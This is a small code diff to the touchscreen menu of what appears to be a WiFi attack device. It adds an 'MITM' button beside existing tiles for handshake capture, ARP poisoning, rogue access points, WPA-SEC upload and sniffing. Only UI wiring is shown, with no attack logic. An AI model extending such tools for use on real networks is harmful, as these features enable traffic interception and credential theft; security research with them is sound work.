     create_small_tile(attack_tiles, LV_SYMBOL_DOWNLOAD, "Handshake", COLOR_MATERIAL_AMBER, attack_tile_event_cb, "Handshaker");
-    // Row 2: ARP Poison, Rogue AP, WPA-SEC Upload, Observer
+    // Row 2: ARP Poison, MITM, Rogue AP, WPA-SEC Upload, Observer
     create_small_tile(attack_tiles, LV_SYMBOL_SHUFFLE, "ARP Poison", COLOR_MATERIAL_TEAL, attack_tile_event_cb, "ARP Poison");
+    create_small_tile(attack_tiles, LV_SYMBOL_LOOP, "MITM", lv_color_make(121, 85, 72), attack_tile_event_cb, "MITM");
     create_small_tile(attack_tiles, LV_SYMBOL_WIFI, "Rogue AP", COLOR_MATERIAL_INDIGO, attack_tile_event_cb, "Rogue AP");
     create_small_tile(attack_tiles, LV_SYMBOL_UPLOAD, "WPA-SEC", COLOR_MATERIAL_CYAN, attack_tile_event_cb, "WPA-SEC Upload");
     create_small_tile(attack_tiles, LV_SYMBOL_EYE_OPEN, "Observer", COLOR_MATERIAL_PURPLE, attack_tile_event_cb, "Sniffer");
